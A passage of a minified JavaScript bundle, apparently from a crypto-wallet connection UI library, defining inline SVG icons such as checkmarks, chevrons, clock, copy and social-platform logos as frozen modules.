    d="M25.5297 4.92733C26.1221 5.4242 26.1996 6.30724 25.7027 6.89966L12.2836 22.8997C12.0316 23.2001 11.6652 23.3811 11.2735 23.3986C10.8817 23.4161 10.5006 23.2686 10.2228 22.9919L2.38218 15.1815C1.83439 14.6358 1.83268 13.7494 2.37835 13.2016C2.92403 12.6538 3.81046 12.6521 4.35825 13.1978L11.1183 19.9317L23.5573 5.10036C24.0542 4.50794 24.9372 4.43047 25.5297 4.92733Z"
    fill="currentColor"/>
</svg>
`,F0t=Object.freeze(Object.defineProperty({__proto__:null,checkmarkSvg:j0t},Symbol.toStringTag,{value:"Module"})),q0t=xe`<svg fill="none" viewBox="0 0 14 14">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M12.9576 2.23383C13.3807 2.58873 13.4361 3.21947 13.0812 3.64263L6.37159 11.6426C6.19161 11.8572 5.92989 11.9865 5.65009 11.999C5.3703 12.0115 5.09808 11.9062 4.89965 11.7085L0.979321 7.80331C0.588042 7.41354 0.586817 6.78038 0.976585 6.3891C1.36635 5.99782 1.99952 5.99659 2.3908 6.38636L5.53928 9.52268L11.5488 2.35742C11.9037 1.93426 12.5344 1.87893 12.9576 2.23383Z"
    clip-rule="evenodd"
  />
</svg>`,z0t=Object.freeze(Object.defineProperty({__proto__:null,checkmarkBoldSvg:q0t},Symbol.toStringTag,{value:"Module"})),W0t=xe`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M1.46 4.96a1 1 0 0 1 1.41 0L8 10.09l5.13-5.13a1 1 0 1 1 1.41 1.41l-5.83 5.84a1 1 0 0 1-1.42 0L1.46 6.37a1 1 0 0 1 0-1.41Z"
    clip-rule="evenodd"
  />
</svg>`,H0t=Object.freeze(Object.defineProperty({__proto__:null,chevronBottomSvg:W0t},Symbol.toStringTag,{value:"Module"})),V0t=xe`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M11.04 1.46a1 1 0 0 1 0 1.41L5.91 8l5.13 5.13a1 1 0 1 1-1.41 1.41L3.79 8.71a1 1 0 0 1 0-1.42l5.84-5.83a1 1 0 0 1 1.41 0Z"
    clip-rule="evenodd"
  />
</svg>`,K0t=Object.freeze(Object.defineProperty({__proto__:null,chevronLeftSvg:V0t},Symbol.toStringTag,{value:"Module"})),G0t=xe`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M4.96 14.54a1 1 0 0 1 0-1.41L10.09 8 4.96 2.87a1 1 0 0 1 1.41-1.41l5.84 5.83a1 1 0 0 1 0 1.42l-5.84 5.83a1 1 0 0 1-1.41 0Z"
    clip-rule="evenodd"
  />
</svg>`,Z0t=Object.freeze(Object.defineProperty({__proto__:null,chevronRightSvg:G0t},Symbol.toStringTag,{value:"Module"})),Y0t=xe`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M14.54 11.04a1 1 0 0 1-1.41 0L8 5.92l-5.13 5.12a1 1 0 1 1-1.41-1.41l5.83-5.84a1 1 0 0 1 1.42 0l5.83 5.84a1 1 0 0 1 0 1.41Z"
    clip-rule="evenodd"
  />
</svg>`,J0t=Object.freeze(Object.defineProperty({__proto__:null,chevronTopSvg:Y0t},Symbol.toStringTag,{value:"Module"})),Q0t=xe`<svg width="36" height="36" fill="none">
  <path
    fill="#fff"
    fill-opacity=".05"
    d="M0 14.94c0-5.55 0-8.326 1.182-10.4a9 9 0 0 1 3.359-3.358C6.614 0 9.389 0 14.94 0h6.12c5.55 0 8.326 0 10.4 1.182a9 9 0 0 1 3.358 3.359C36 6.614 36 9.389 36 14.94v6.12c0 5.55 0 8.326-1.182 10.4a9 9 0 0 1-3.359 3.358C29.386 36 26.611 36 21.06 36h-6.12c-5.55 0-8.326 0-10.4-1.182a9 9 0 0 1-3.358-3.359C0 29.386 0 26.611 0 21.06v-6.12Z"
  />
  <path
    stroke="#fff"
    stroke-opacity=".05"
    d="M14.94.5h6.12c2.785 0 4.84 0 6.46.146 1.612.144 2.743.43 3.691.97a8.5 8.5 0 0 1 3.172 3.173c.541.948.826 2.08.971 3.692.145 1.62.146 3.675.146 6.459v6.12c0 2.785 0 4.84-.146 6.46-.145 1.612-.43 2.743-.97 3.691a8.5 8.5 0 0 1-3.173 3.172c-.948.541-2.08.826-3.692.971-1.62.145-3.674.146-6.459.146h-6.12c-2.784 0-4.84 0-6.46-.146-1.612-.145-2.743-.43-3.691-.97a8.5 8.5 0 0 1-3.172-3.173c-.541-.948-.827-2.08-.971-3.692C.5 25.9.5 23.845.5 21.06v-6.12c0-2.784 0-4.84.146-6.46.144-1.612.43-2.743.97-3.691A8.5 8.5 0 0 1 4.79 1.617C5.737 1.076 6.869.79 8.48.646 10.1.5 12.156.5 14.94.5Z"
  />
  <path
    fill="url(#a)"
    d="M17.998 10.8h12.469a14.397 14.397 0 0 0-24.938.001l6.234 10.798.006-.001a7.19 7.19 0 0 1 6.23-10.799Z"
  />
  <path
    fill="url(#b)"
    d="m24.237 21.598-6.234 10.798A14.397 14.397 0 0 0 30.47 10.798H18.002l-.002.006a7.191 7.191 0 0 1 6.237 10.794Z"
  />
  <path
    fill="url(#c)"
    d="M11.765 21.601 5.531 10.803A14.396 14.396 0 0 0 18.001 32.4l6.235-10.798-.004-.004a7.19 7.19 0 0 1-12.466.004Z"
  />
  <path fill="#fff" d="M18 25.2a7.2 7.2 0 1 0 0-14.4 7.2 7.2 0 0 0 0 14.4Z" />
  <path fill="#1A73E8" d="M18 23.7a5.7 5.7 0 1 0 0-11.4 5.7 5.7 0 0 0 0 11.4Z" />
  <defs>
    <linearGradient
      id="a"
      x1="6.294"
      x2="41.1"
      y1="5.995"
      y2="5.995"
      gradientUnits="userSpaceOnUse"
    >
      <stop stop-color="#D93025" />
      <stop offset="1" stop-color="#EA4335" />
    </linearGradient>
    <linearGradient
      id="b"
      x1="20.953"
      x2="37.194"
      y1="32.143"
      y2="2.701"
      gradientUnits="userSpaceOnUse"
    >
      <stop stop-color="#FCC934" />
      <stop offset="1" stop-color="#FBBC04" />
    </linearGradient>
    <linearGradient
      id="c"
      x1="25.873"
      x2="9.632"
      y1="31.2"
      y2="1.759"
      gradientUnits="userSpaceOnUse"
    >
      <stop stop-color="#1E8E3E" />
      <stop offset="1" stop-color="#34A853" />
    </linearGradient>
  </defs>
</svg>`,X0t=Object.freeze(Object.defineProperty({__proto__:null,chromeStoreSvg:Q0t},Symbol.toStringTag,{value:"Module"})),eft=xe`<svg width="14" height="14" viewBox="0 0 14 14" fill="none">
  <path 
    fill-rule="evenodd" 
    clip-rule="evenodd" 
    d="M7.00235 2C4.24 2 2.00067 4.23858 2.00067 7C2.00067 9.76142 4.24 12 7.00235 12C9.7647 12 12.004 9.76142 12.004 7C12.004 4.23858 9.7647 2 7.00235 2ZM0 7C0 3.13401 3.13506 0 7.00235 0C10.8696 0 14.0047 3.13401 14.0047 7C14.0047 10.866 10.8696 14 7.00235 14C3.13506 14 0 10.866 0 7ZM7.00235 3C7.55482 3 8.00269 3.44771 8.00269 4V6.58579L9.85327 8.43575C10.2439 8.82627 10.2439 9.45944 9.85327 9.84996C9.46262 10.2405 8.82924 10.2405 8.43858 9.84996L6.29501 7.70711C6.10741 7.51957 6.00201 7.26522 6.00201 7V4C6.00201 3.44771 6.44988 3 7.00235 3Z" 
    fill="currentColor"
  />
</svg>`,tft=Object.freeze(Object.defineProperty({__proto__:null,clockSvg:eft},Symbol.toStringTag,{value:"Module"})),rft=xe`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M2.54 2.54a1 1 0 0 1 1.42 0L8 6.6l4.04-4.05a1 1 0 1 1 1.42 1.42L9.4 8l4.05 4.04a1 1 0 0 1-1.42 1.42L8 9.4l-4.04 4.05a1 1 0 0 1-1.42-1.42L6.6 8 2.54 3.96a1 1 0 0 1 0-1.42Z"
    clip-rule="evenodd"
  />
</svg>`,ift=Object.freeze(Object.defineProperty({__proto__:null,closeSvg:rft},Symbol.toStringTag,{value:"Module"})),nft=xe`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M8 2a6 6 0 1 0 0 12A6 6 0 0 0 8 2ZM0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm10.66-2.65a1 1 0 0 1 .23 1.06L9.83 9.24a1 1 0 0 1-.59.58l-2.83 1.06A1 1 0 0 1 5.13 9.6l1.06-2.82a1 1 0 0 1 .58-.59L9.6 5.12a1 1 0 0 1 1.06.23ZM7.9 7.89l-.13.35.35-.13.12-.35-.34.13Z"
    clip-rule="evenodd"
  />
</svg>`,sft=Object.freeze(Object.defineProperty({__proto__:null,compassSvg:nft},Symbol.toStringTag,{value:"Module"})),oft=xe`<svg fill="none" viewBox="0 0 20 20">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M10 3a7 7 0 0 0-6.85 8.44l8.29-8.3C10.97 3.06 10.49 3 10 3Zm3.49.93-9.56 9.56c.32.55.71 1.06 1.16 1.5L15 5.1a7.03 7.03 0 0 0-1.5-1.16Zm2.7 2.8-9.46 9.46a7 7 0 0 0 9.46-9.46ZM1.99 5.9A9 9 0 1 1 18 14.09 9 9 0 0 1 1.98 5.91Z"
    clip-rule="evenodd"
  />
</svg>`,aft=Object.freeze(Object.defineProperty({__proto__:null,coinPlaceholderSvg:oft},Symbol.toStringTag,{value:"Module"})),cft=xe`<svg
  xmlns="http://www.w3.org/2000/svg"
  width="16"
  height="16"
  viewBox="0 0 16 16"
  fill="none"
>
  <path
    fill="currentColor"
    fill-rule="evenodd"
    clip-rule="evenodd"
    d="M9.21498 1.28565H10.5944C11.1458 1.28562 11.6246 1.2856 12.0182 1.32093C12.4353 1.35836 12.853 1.44155 13.2486 1.66724C13.7005 1.92498 14.0749 2.29935 14.3326 2.75122C14.5583 3.14689 14.6415 3.56456 14.6789 3.9817C14.7143 4.37531 14.7142 4.85403 14.7142 5.40545V6.78489C14.7142 7.33631 14.7143 7.81503 14.6789 8.20865C14.6415 8.62578 14.5583 9.04345 14.3326 9.43912C14.0749 9.89099 13.7005 10.2654 13.2486 10.5231C12.853 10.7488 12.4353 10.832 12.0182 10.8694C11.7003 10.8979 11.3269 10.9034 10.9045 10.9045C10.9034 11.3269 10.8979 11.7003 10.8694 12.0182C10.832 12.4353 10.7488 12.853 10.5231 13.2486C10.2654 13.7005 9.89099 14.0749 9.43912 14.3326C9.04345 14.5583 8.62578 14.6415 8.20865 14.6789C7.81503 14.7143 7.33631 14.7142 6.78489 14.7142H5.40545C4.85403 14.7142 4.37531 14.7143 3.9817 14.6789C3.56456 14.6415 3.14689 14.5583 2.75122 14.3326C2.29935 14.0749 1.92498 13.7005 1.66724 13.2486C1.44155 12.853 1.35836 12.4353 1.32093 12.0182C1.2856 11.6246 1.28562 11.1458 1.28565 10.5944V9.21498C1.28562 8.66356 1.2856 8.18484 1.32093 7.79122C1.35836 7.37409 1.44155 6.95642 1.66724 6.56074C1.92498 6.10887 2.29935 5.73451 2.75122 5.47677C3.14689 5.25108 3.56456 5.16789 3.9817 5.13045C4.2996 5.10192 4.67301 5.09645 5.09541 5.09541C5.09645 4.67302 5.10192 4.2996 5.13045 3.9817C5.16789 3.56456 5.25108 3.14689 5.47676 2.75122C5.73451 2.29935 6.10887 1.92498 6.56074 1.66724C6.95642 1.44155 7.37409 1.35836 7.79122 1.32093C8.18484 1.2856 8.66356 1.28562 9.21498 1.28565ZM5.09541 7.09552C4.68397 7.09667 4.39263 7.10161 4.16046 7.12245C3.88053 7.14757 3.78516 7.18949 3.74214 7.21403C3.60139 7.29431 3.48478 7.41091 3.4045 7.55166C3.37997 7.59468 3.33804 7.69005 3.31292 7.96999C3.28659 8.26345 3.28565 8.65147 3.28565 9.25708V10.5523C3.28565 11.1579 3.28659 11.5459 3.31292 11.8394C3.33804 12.1193 3.37997 12.2147 3.4045 12.2577C3.48478 12.3985 3.60139 12.5151 3.74214 12.5954C3.78516 12.6199 3.88053 12.6618 4.16046 12.6869C4.45393 12.7133 4.84195 12.7142 5.44755 12.7142H6.74279C7.3484 12.7142 7.73641 12.7133 8.02988 12.6869C8.30981 12.6618 8.40518 12.6199 8.44821 12.5954C8.58895 12.5151 8.70556 12.3985 8.78584 12.2577C8.81038 12.2147 8.8523 12.1193 8.87742 11.8394C8.89825 11.6072 8.90319 11.3159 8.90435 10.9045C8.48219 10.9034 8.10898 10.8979 7.79122 10.8694C7.37409 10.832 6.95641 10.7488 6.56074 10.5231C6.10887 10.2654 5.73451 9.89099 5.47676 9.43912C5.25108 9.04345 5.16789 8.62578 5.13045 8.20865C5.10194 7.89089 5.09645 7.51767 5.09541 7.09552ZM7.96999 3.31292C7.69005 3.33804 7.59468 3.37997 7.55166 3.4045C7.41091 3.48478 7.29431 3.60139 7.21403 3.74214C7.18949 3.78516 7.14757 3.88053 7.12245 4.16046C7.09611 4.45393 7.09517 4.84195 7.09517 5.44755V6.74279C7.09517 7.3484 7.09611 7.73641 7.12245 8.02988C7.14757 8.30981 7.18949 8.40518 7.21403 8.4482C7.29431 8.58895 7.41091 8.70556 7.55166 8.78584C7.59468 8.81038 7.69005 8.8523 7.96999 8.87742C8.26345 8.90376 8.65147 8.9047 9.25708 8.9047H10.5523C11.1579 8.9047 11.5459 8.90376 11.8394 8.87742C12.1193 8.8523 12.2147 8.81038 12.2577 8.78584C12.3985 8.70556 12.5151 8.58895 12.5954 8.4482C12.6199 8.40518 12.6618 8.30981 12.6869 8.02988C12.7133 7.73641 12.7142 7.3484 12.7142 6.74279V5.44755C12.7142 4.84195 12.7133 4.45393 12.6869 4.16046C12.6618 3.88053 12.6199 3.78516 12.5954 3.74214C12.5151 3.60139 12.3985 3.48478 12.2577 3.4045C12.2147 3.37997 12.1193 3.33804 11.8394 3.31292C11.5459 3.28659 11.1579 3.28565 10.5523 3.28565H9.25708C8.65147 3.28565 8.26345 3.28659 7.96999 3.31292Z"
    fill="#788181"
  /></svg
>`,lft=Object.freeze(Object.defineProperty({__proto__:null,copySvg:cft},Symbol.toStringTag,{value:"Module"})),uft=xe` <svg fill="none" viewBox="0 0 13 4">
  <path fill="currentColor" d="M.5 0h12L8.9 3.13a3.76 3.76 0 0 1-4.8 0L.5 0Z" />
</svg>`,dft=Object.freeze(Object.defineProperty({__proto__:null,cursorSvg:uft},Symbol.toStringTag,{value:"Module"})),hft=xe`<svg fill="none" viewBox="0 0 14 6">
  <path style="fill: var(--wui-color-bg-150);" d="M0 1h14L9.21 5.12a3.31 3.31 0 0 1-4.49 0L0 1Z" />
  <path
    style="stroke: var(--wui-color-inverse-100);"
    stroke-opacity=".05"
    d="M1.33 1.5h11.32L8.88 4.75l-.01.01a2.81 2.81 0 0 1-3.8 0l-.02-.01L1.33 1.5Z"
  />
  <path
    style="fill: var(--wui-color-bg-150);"
    d="M1.25.71h11.5L9.21 3.88a3.31 3.31 0 0 1-4.49 0L1.25.71Z"
  />
</svg> `,fft=Object.freeze(Object.defineProperty({__proto__:null,cursorTransparentSvg:hft},Symbol.toStringTag,{value:"Module"})),pft=xe`<svg fill="none" viewBox="0 0 20 20">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M13.66 2H6.34c-1.07 0-1.96 0-2.68.08-.74.08-1.42.25-2.01.68a4 4 0 0 0-.89.89c-.43.6-.6 1.27-.68 2.01C0 6.38 0 7.26 0 8.34v.89c0 1.07 0 1.96.08 2.68.08.74.25 1.42.68 2.01a4 4 0 0 0 .89.89c.6.43 1.27.6 2.01.68a27 27 0 0 0 2.68.08h7.32a27 27 0 0 0 2.68-.08 4.03 4.03 0 0 0 2.01-.68 4 4 0 0 0 .89-.89c.43-.6.6-1.27.68-2.01.08-.72.08-1.6.08-2.68v-.89c0-1.07 0-1.96-.08-2.68a4.04 4.04 0 0 0-.68-2.01 4 4 0 0 0-.89-.89c-.6-.43-1.27-.6-2.01-.68C15.62 2 14.74 2 13.66 2ZM2.82 4.38c.2-.14.48-.25 1.06-.31C4.48 4 5.25 4 6.4 4h7.2c1.15 0 1.93 0 2.52.07.58.06.86.17 1.06.31a2 2 0 0 1 .44.44c.14.2.25.48.31 1.06.07.6.07 1.37.07 2.52v.77c0 1.15 0 1.93-.07 2.52-.06.58-.17.86-.31 1.06a2 2 0 0 1-.44.44c-.2.14-.48.25-1.06.32-.6.06-1.37.06-2.52.06H6.4c-1.15 0-1.93 0-2.52-.06-.58-.07-.86-.18-1.06-.32a2 2 0 0 1-.44-.44c-.14-.2-.25-.48-.31-1.06C2 11.1 2 10.32 2 9.17V8.4c0-1.15 0-1.93.07-2.52.06-.58.17-.86.31-1.06a2 2 0 0 1 .44-.44Z"
    clip-rule="evenodd"
  />
  <path fill="currentColor" d="M6.14 17.57a1 1 0 1 0 0 2h7.72a1 1 0 1 0 0-2H6.14Z" />
</svg>`,gft=Object.freeze(Object.defineProperty({__proto__:null,desktopSvg:pft},Symbol.toStringTag,{value:"Module"})),mft=xe`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M6.07 1h.57a1 1 0 0 1 0 2h-.52c-.98 0-1.64 0-2.14.06-.48.05-.7.14-.84.24-.13.1-.25.22-.34.35-.1.14-.2.35-.25.83-.05.5-.05 1.16-.05 2.15v2.74c0 .99 0 1.65.05 2.15.05.48.14.7.25.83.1.14.2.25.34.35.14.1.36.2.84.25.5.05 1.16.05 2.14.05h.52a1 1 0 0 1 0 2h-.57c-.92 0-1.69 0-2.3-.07a3.6 3.6 0 0 1-1.8-.61c-.3-.22-.57-.49-.8-.8a3.6 3.6 0 0 1-.6-1.79C.5 11.11.5 10.35.5 9.43V6.58c0-.92 0-1.7.06-2.31a3.6 3.6 0 0 1 .62-1.8c.22-.3.48-.57.79-.79a3.6 3.6 0 0 1 1.8-.61C4.37 1 5.14 1 6.06 1ZM9.5 3a1 1 0 0 1 1.42 0l4.28 4.3a1 1 0 0 1 0 1.4L10.93 13a1 1 0 0 1-1.42-1.42L12.1 9H6.8a1 1 0 1 1 0-2h5.3L9.51 4.42a1 1 0 0 1 0-1.41Z"
    clip-rule="evenodd"
  />
</svg>`,wft=Object.freeze(Object.defineProperty({__proto__:null,disconnectSvg:mft},Symbol.toStringTag,{value:"Module"})),bft=xe`<svg fill="none" viewBox="0 0 40 40">
  <g clip-path="url(#a)">
    <g clip-path="url(#b)">
      <circle cx="20" cy="19.89" r="20" fill="#5865F2" />
      <path
        fill="#fff"
        fill-rule="evenodd"
        d="M25.71 28.15C30.25 28 32 25.02 32 25.02c0-6.61-2.96-11.98-2.96-11.98-2.96-2.22-5.77-2.15-5.77-2.15l-.29.32c3.5 1.07 5.12 2.61 5.12 2.61a16.75 16.75 0 0 0-10.34-1.93l-.35.04a15.43 15.43 0 0 0-5.88 1.9s1.71-1.63 5.4-2.7l-.2-.24s-2.81-.07-5.77 2.15c0 0-2.96 5.37-2.96 11.98 0 0 1.73 2.98 6.27 3.13l1.37-1.7c-2.6-.79-3.6-2.43-3.6-2.43l.58.35.09.06.08.04.02.01.08.05a17.25 17.25 0 0 0 4.52 1.58 14.4 14.4 0 0 0 8.3-.86c.72-.27 1.52-.66 2.37-1.21 0 0-1.03 1.68-3.72 2.44.61.78 1.35 1.67 1.35 1.67Zm-9.55-9.6c-1.17 0-2.1 1.03-2.1 2.28 0 1.25.95 2.28 2.1 2.28 1.17 0 2.1-1.03 2.1-2.28.01-1.25-.93-2.28-2.1-2.28Zm7.5 0c-1.17 0-2.1 1.03-2.1 2.28 0 1.25.95 2.28 2.1 2.28 1.17 0 2.1-1.03 2.1-2.28 0-1.25-.93-2.28-2.1-2.28Z"
        clip-rule="evenodd"
      />
    </g>
  </g>
  <defs>
    <clipPath id="a"><rect width="40" height="40" fill="#fff" rx="20" /></clipPath>
    <clipPath id="b"><path fill="#fff" d="M0 0h40v40H0z" /></clipPath>
  </defs>
</svg>`,vft=Object.freeze(Object.defineProperty({__proto__:null,discordSvg:bft},Symbol.toStringTag,{value:"Module"})),yft=xe`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    d="M4.25 7a.63.63 0 0 0-.63.63v3.97c0 .28-.2.51-.47.54l-.75.07a.93.93 0 0 1-.9-.47A7.51 7.51 0 0 1 5.54.92a7.5 7.5 0 0 1 9.54 4.62c.12.35.06.72-.16 1-.74.97-1.68 1.78-2.6 2.44V4.44a.64.64 0 0 0-.63-.64h-1.06c-.35 0-.63.3-.63.64v5.5c0 .23-.12.42-.32.5l-.52.23V6.05c0-.36-.3-.64-.64-.64H7.45c-.35 0-.64.3-.64.64v4.97c0 .25-.17.46-.4.52a5.8 5.8 0 0 0-.45.11v-4c0-.36-.3-.65-.64-.65H4.25ZM14.07 12.4A7.49 7.49 0 0 1 3.6 14.08c4.09-.58 9.14-2.5 11.87-6.6v.03a7.56 7.56 0 0 1-1.41 4.91Z"
  />
</svg>`,xft=Object.freeze(Object.defineProperty({__proto__:null,etherscanSvg:yft},Symbol.toStringTag,{value:"Module"})),Cft=xe`<svg fill="none" viewBox="0 0 14 15">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M6.71 2.99a.57.57 0 0 0-.57.57 1 1 0 0 1-1 1c-.58 0-.96 0-1.24.03-.27.03-.37.07-.42.1a.97.97 0 0 0-.36.35c-.04.08-.09.21-.11.67a2.57 2.57 0 0 1 0 5.13c.02.45.07.6.11.66.09.15.21.28.36.36.07.04.21.1.67.12a2.57 2.57 0 0 1 5.12 0c.46-.03.6-.08.67-.12a.97.97 0 0 0 .36-.36c.03-.04.07-.14.1-.41.02-.29.03-.66.03-1.24a1 1 0 0 1 1-1 .57.57 0 0 0 0-1.15 1 1 0 0 1-1-1c0-.58 0-.95-.03-1.24a1.04 1.04 0 0 0-.1-.42.97.97 0 0 0-.36-.36 1.04 1.04 0 0 0-.42-.1c-.28-.02-.65-.02-1.24-.02a1 1 0 0 1-1-1 .57.57 0 0 0-.57-.57ZM5.15 13.98a1 1 0 0 0 .99-1v-.78a.57.57 0 0 1 1.14 0v.78a1 1 0 0 0 .99 1H8.36a66.26 66.26 0 0 0 .73 0 3.78 3.78 0 0 0 1.84-.38c.46-.26.85-.64 1.1-1.1.23-.4.32-.8.36-1.22.02-.2.03-.4.03-.63a2.57 2.57 0 0 0 0-4.75c0-.23-.01-.44-.03-.63a2.96 2.96 0 0 0-.35-1.22 2.97 2.97 0 0 0-1.1-1.1c-.4-.22-.8-.31-1.22-.35a8.7 8.7 0 0 0-.64-.04 2.57 2.57 0 0 0-4.74 0c-.23 0-.44.02-.63.04-.42.04-.83.13-1.22.35-.46.26-.84.64-1.1 1.1-.33.57-.37 1.2-.39 1.84a21.39 21.39 0 0 0 0 .72v.1a1 1 0 0 0 1 .99h.78a.57.57 0 0 1 0 1.15h-.77a1 1 0 0 0-1 .98v.1a63.87 63.87 0 0 0 0 .73c0 .64.05 1.27.38 1.83.26.47.64.85 1.1 1.11.56.32 1.2.37 1.84.38a20.93 20.93 0 0 0 .72 0h.1Z"
    clip-rule="evenodd"
  />
</svg>`,Eft=Object.freeze(Object.defineProperty({__proto__:null,extensionSvg:Cft},Symbol.toStringTag,{value:"Module"})),_ft=xe`<svg fill="none" viewBox="0 0 14 15">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M3.74 3.99a1 1 0 0 1 1-1H11a1 1 0 0 1 1 1v6.26a1 1 0 0 1-2 0V6.4l-6.3 6.3a1 1 0 0 1-1.4-1.42l6.29-6.3H4.74a1 1 0 0 1-1-1Z"
    clip-rule="evenodd"
  />
</svg>`,Sft=Object.freeze(Object.defineProperty({__proto__:null,externalLinkSvg:_ft},Symbol.toStringTag,{value:"Module"})),Aft=xe`<svg fill="none" viewBox="0 0 40 40">
  <g clip-path="url(#a)">
    <g clip-path="url(#b)">
      <circle cx="20" cy="19.89" r="20" fill="#1877F2" />
      <g clip-path="url(#c)">
        <path
          fill="#fff"
          d="M26 12.38h-2.89c-.92 0-1.61.38-1.61 1.34v1.66H26l-.36 4.5H21.5v12H17v-12h-3v-4.5h3V12.5c0-3.03 1.6-4.62 5.2-4.62H26v4.5Z"
        />
      </g>
    </g>
    <path
      fill="#1877F2"
      d="M40 20a20 20 0 1 0-23.13 19.76V25.78H11.8V20h5.07v-4.4c0-5.02 3-7.79 7.56-7.79 2.19 0 4.48.4 4.48.4v4.91h-2.53c-2.48 0-3.25 1.55-3.25 3.13V20h5.54l-.88 5.78h-4.66v13.98A20 20 0 0 0 40 20Z"
    />
    <path
      fill="#fff"
      d="m27.79 25.78.88-5.78h-5.55v-3.75c0-1.58.78-3.13 3.26-3.13h2.53V8.2s-2.3-.39-4.48-.39c-4.57 0-7.55 2.77-7.55 7.78V20H11.8v5.78h5.07v13.98a20.15 20.15 0 0 0 6.25 0V25.78h4.67Z"
    />
  </g>
  <defs>
    <clipPath id="a"><rect width="40" height="40" fill="#fff" rx="20" /></clipPath>
    <clipPath id="b"><path fill="#fff" d="M0 0h40v40H0z" /></clipPath>
    <clipPath id="c"><path fill="#fff" d="M8 7.89h24v24H8z" /></clipPath>
  </defs>
</svg>`,Ift=Object.freeze(Object.defineProperty({__proto__:null,facebookSvg:Aft},Symbol.toStringTag,{value:"Module"})),Tft=xe`<svg style="border-radius: 9999px; overflow: hidden;"  fill="none" viewBox="0 0 1000 1000">
  <rect width="1000" height="1000" rx="9999" ry="9999" fill="#855DCD"/>
  <path fill="#855DCD" d="M0 0h1000v1000H0V0Z" />
  <path
    fill="#fff"
    d="M320 248h354v504h-51.96V521.13h-.5c-5.76-63.8-59.31-113.81-124.54-113.81s-118.78 50-124.53 113.81h-.5V752H320V248Z"
  />
  <path
    fill="#fff"
    d="m225 320 21.16 71.46h17.9v289.09a16.29 16.29 0 0 0-16.28 16.24v19.49h-3.25a16.3 16.3 0 0 0-16.28 16.24V752h182.26v-19.48a16.22 16.22 0 0 0-16.28-16.24h-3.25v-19.5a16.22 16.22 0 0 0-16.28-16.23h-19.52V320H225Zm400.3 360.55a16.3 16.3 0 0 0-15.04 10.02 16.2 16.2 0 0 0-1.24 6.22v19.49h-3.25a16.29 16.29 0 0 0-16.27 16.24V752h182.24v-19.48a16.23 16.23 0 0 0-16.27-16.24h-3.25v-19.5a16.2 16.2 0 0 0-10.04-15 16.3 16.3 0 0 0-6.23-1.23v-289.1h17.9L775 320H644.82v360.55H625.3Z"
  />
</svg>`,kft=Object.freeze(Object.defineProperty({__proto__:null,farcasterSvg:Tft},Symbol.toStringTag,{value:"Module"})),Nft=xe`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M0 3a1 1 0 0 1 1-1h14a1 1 0 1 1 0 2H1a1 1 0 0 1-1-1Zm2.63 5.25a1 1 0 0 1 1-1h8.75a1 1 0 1 1 0 2H3.63a1 1 0 0 1-1-1Zm2.62 5.25a1 1 0 0 1 1-1h3.5a1 1 0 0 1 0 2h-3.5a1 1 0 0 1-1-1Z"
    clip-rule="evenodd"
  />
</svg>`,Pft=Object.freeze(Object.defineProperty({__proto__:null,filtersSvg:Nft},Symbol.toStringTag,{value:"Module"})),$ft=xe`<svg fill="none" viewBox="0 0 40 40">
  <g clip-path="url(#a)">
    <g clip-path="url(#b)">
      <circle cx="20" cy="19.89" r="20" fill="#1B1F23" />
      <g clip-path="url(#c)">
        <path
          fill="#fff"
          d="M8 19.89a12 12 0 1 1 15.8 11.38c-.6.12-.8-.26-.8-.57v-3.3c0-1.12-.4-1.85-.82-2.22 2.67-.3 5.48-1.31 5.48-5.92 0-1.31-.47-2.38-1.24-3.22.13-.3.54-1.52-.12-3.18 0 0-1-.32-3.3 1.23a11.54 11.54 0 0 0-6 0c-2.3-1.55-3.3-1.23-3.3-1.23a4.32 4.32 0 0 0-.12 3.18 4.64 4.64 0 0 0-1.24 3.22c0 4.6 2.8 5.63 5.47 5.93-.34.3-.65.83-.76 1.6-.69.31-2.42.84-3.5-1 0 0-.63-1.15-1.83-1.23 0 0-1.18-.02-.09.73 0 0 .8.37 1.34 1.76 0 0 .7 2.14 4.03 1.41v2.24c0 .31-.2.68-.8.57A12 12 0 0 1 8 19.9Z"
        />
      </g>
    </g>
  </g>
  <defs>
    <clipPath id="a"><rect width="40" height="40" fill="#fff" rx="20" /></clipPath>
    <clipPath id="b"><path fill="#fff" d="M0 0h40v40H0z" /></clipPath>
    <clipPath id="c"><path fill="#fff" d="M8 7.89h24v24H8z" /></clipPath>
  </defs>
</svg>`,Rft=Object.freeze(Object.defineProperty({__proto__:null,githubSvg:$ft},Symbol.toStringTag,{value:"Module"})),Oft=xe`<svg fill="none" viewBox="0 0 40 40">
  <path
    fill="#4285F4"
    d="M32.74 20.3c0-.93-.08-1.81-.24-2.66H20.26v5.03h7a6 6 0 0 1-2.62 3.91v3.28h4.22c2.46-2.27 3.88-5.6 3.88-9.56Z"
  />
  <path
    fill="#34A853"
    d="M20.26 33a12.4 12.4 0 0 0 8.6-3.14l-4.22-3.28a7.74 7.74 0 0 1-4.38 1.26 7.76 7.76 0 0 1-7.28-5.36H8.65v3.36A12.99 12.99 0 0 0 20.26 33Z"
  />
  <path
    fill="#FBBC05"
    d="M12.98 22.47a7.79 7.79 0 0 1 0-4.94v-3.36H8.65a12.84 12.84 0 0 0 0 11.66l3.37-2.63.96-.73Z"
  />
  <path
    fill="#EA4335"
    d="M20.26 12.18a7.1 7.1 0 0 1 4.98 1.93l3.72-3.72A12.47 12.47 0 0 0 20.26 7c-5.08 0-9.47 2.92-11.6 7.17l4.32 3.36a7.76 7.76 0 0 1 7.28-5.35Z"
  />
